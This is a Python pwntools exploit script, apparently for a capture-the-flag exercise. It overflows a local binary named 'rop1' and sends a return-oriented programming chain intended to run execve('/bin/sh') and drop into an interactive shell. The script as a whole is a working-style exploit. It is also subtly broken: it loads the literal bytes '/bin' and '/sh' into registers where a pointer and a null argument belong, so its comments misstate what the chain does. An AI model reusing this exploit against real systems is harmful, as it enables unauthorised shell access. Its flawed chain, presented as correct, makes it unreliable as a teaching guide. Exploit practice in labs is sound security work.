#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

# ROP gadgets from binary
POP_EAX = 0x0804919a
POP_EBX = 0x0804901e
POP_ECX = 0x080491a4
INT_80  = 0x080491b4

def build_rop_chain():
    rop = b"A" * 28    # Padding to reach return address

    # execve(pointer_to_binsh, 0, 0)
    rop += p32(POP_EAX)
    rop += p32(0xb)            # syscall number for execve
    
    rop += p32(POP_EBX)
    rop += b"/bin"             # First part of command
    
    rop += p32(POP_ECX)
    rop += b"/sh\x00"          # Second part + null terminator
    
    rop += p32(INT_80)         # Execute syscall

    return rop

def main():
    p = process('./rop1')
    
    payload = build_rop_chain()
    print(f"Payload length: {len(payload)}")
    p.sendline(payload)
    
    p.interactive()

if __name__ == "__main__":
    main()
